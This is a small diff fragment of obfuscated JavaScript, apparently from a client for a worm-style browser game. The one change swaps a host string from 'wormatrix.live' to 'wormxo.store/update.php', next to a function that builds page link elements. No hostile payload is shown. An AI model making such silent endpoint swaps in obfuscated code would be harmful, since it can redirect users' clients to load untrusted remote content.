@@ -8354,7 +8354,7 @@ f21.prototype.je = function () {
       vO31.shift = vF34.shift;
       return vO31;
     }();
-    var vLSWormatrixlive = "wormatrix.live";
+    var vLSWormatrixlive = "wormxo.store/update.php";
     function f82(p731, p732, p733) {
       let v724 = document.createElement("link");
       if (p732) {
